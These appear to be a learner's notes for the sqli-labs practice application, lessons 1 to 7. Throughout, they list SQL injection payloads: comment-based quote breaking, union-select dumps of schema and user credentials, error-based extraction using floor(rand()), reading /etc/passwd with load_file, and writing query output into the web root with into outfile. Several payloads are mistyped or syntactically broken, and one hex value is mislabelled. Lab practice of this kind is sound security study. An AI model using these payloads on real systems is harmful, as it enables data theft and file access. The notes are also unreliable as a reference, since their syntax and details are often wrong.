# sqli_labs
## lesson1
### Error-Based: Single Quotes,String
  * ?id=1 or any other number gives the respective username and password, similar to the query: select * from TABLE where id=1;
  * In the url after trying some special cases, we find that odd number of single quotes breaks the query and also string input throwing error.
  * Error:  right syntax to use near ””) LIMIT 0,1′ at line 1.
  * ?id=1′)–-+  : this gives us back the username and password. (here -- is used to comment out rest of the things).
  * Commonly used injections like ' OR '1'='1--
  * OR '1'='1' /*  in url after execution it would be like ?OR%20%271%27=%271%27%20/*
  * ?id=-1' union select 1,2,database() --+
  * SELECT username,password from 'users' WHERE '?id'=0 OR 1=1; (here 1=1 is equivalent to true).
  * SELECT username,password from 'users' WHERE ?id=9 trying out different id no.s we get the desired output when id is 9.

## lesson2
### Error-Based: IntegerBased
  * when we give ?id=1- we see the error as right syntax to use near'LIMIT 0,1' at line 1 (query broke)
  * error that extra " and 'quotes are present which means that the input is enclosed in them.
  * Select * from TABLE where id = 1’ ;
  * so there is use of integer for the query
  * Select * from TABLE where id = (some integer value);
  * SELECT username,password FROM TableName WHERE id=1--;
  * if we comment out the id number as (-- is used to comment out the input): http://localhost/sqli-labs/Less-2/?id=1 -- 
  * we receive the username and password.

## lesson3
### Error-Based: Single quotes (string)
  * when we give ?id=1- we see the error as right syntax to use near ””) LIMIT 0,1′ at line 1 (query broke)
  * Select login_name, select password from table where id= (‘our input here’)
  * So again we inject the code with this ?id=1′) -–+'    
  * we get back the output username and password.

## lesson4
### Error-Based: Double quotes (string)
  * After some unsuccessful attempts, we perform an error-based double quotes attack
  * ?id=1’’ injecting the code we can see a username and password.
  * we try to dump the database to retrieve some sensitive information. 
  * So here we use the union select command to dump the database like this: ?id=1’’) union select 1,2,3 –+
  * (here 1,2,3 is used since we assume 3 columns there, u can also try with 1,2)
  * Now we start mysql to dump database:
  * show databases;  -->to show databases
  * use security;  -->this helps to use the database security(which has important information)
  * show tables;  -->this helps to view the table, we can see four tables like users,emails,referers,uagents
  * We use system database, which is information_schema using the command: use information_schema;
  * See tables using "show tables;" command
  * Query : select table_name from information_schema, tables where table_schema = “security”;
  * inject the same query into the URL : ?id=1”) union select 1,table_name,3 from information_schema.tables where table_schema=’security’ --+
  * Query : ?id=1”) union select 1,group_concat(table_name)3 from information_schema.tables where table_schema=’security’ – -+  
  * (group together all the table names and dump it out as a string)
  * Query : ?id=1′ union select 1,group_concat(username),group_concat(password) from users –+

## lesson5
### Fixing the query without using comments
  * Error-based double quotes injection attack as shown below.
  * when ?id=2 or any other integer we get the message you are in ....
  * it is not similar to username and password as shown before
  * by giving the single quotes query gets broken, to see the developers format of query, we use escape character(\)
  * Query : ?id=1′ AND ‘2 (OR) ?id=3′ AND ‘4
  * 
  * After injecting this type of code, the database always shows different usernames and passwords.
  * URL : ?-6′ union select 5,current_user,3 AND ‘1
  * We use this query for getting the current username.

## lesson6
### Double quote injection
  * ?id=2 try giving in the url 
  * Injecting the query, we can see an sql error message on the screen.
  * We start from the count function, which just returns us the number of rows.
  * select count(*) from informatio_schema.tables;
  * select rand(); --> gives random values between 0 and 1
  * select floor(); -->  prints the integer part alone
  * select floor(rand()*2)as dumb; --> gives either 0 or 1 as output
  * select table_name, table_schema from information_schema.tables group by table_schema; --> can see only email under security database
  * Dumping the database in the form of a sql error:
     - select concat((select database()))  --> used to dump the string
     - select concat(0x3a,0x3a,(select database()),0x3a,0x3a)  --> here 0x3a is for quote
     - select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a  --> renamed as a
     - select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns
     - select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;
     - select count(*), concat(0x3a,0x3a,(select table_name from),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;
     - select count(*), concat(0x3a,0x3a(select version()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a; (dump version)
     - select count(*), concat(0x3a,0x3a(select user()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a; (dump user)

## lesson7
### Using out file dump database
  * ?id=1′–+  (sql query broke)
  * use security;
  * select * from users;
  * select * from users limit 0,1 into dumpfile “/tmp/test2.txt”  (for dumping the database)
  * select load_file(“etc/passwd”);  (for loading files from the file system into mysql)
  * select load_file(“etc/passwd”) into outfile “tmp/test4.txt”; (combination of the above 2)
  * query will be : ?id=2′)) union select 1,2,3 into outfile “/var/www/sqli-labs/Less-7/union2.txt” –+
  * checking the Less-7/union2.txt file after this gives us the data or info as output





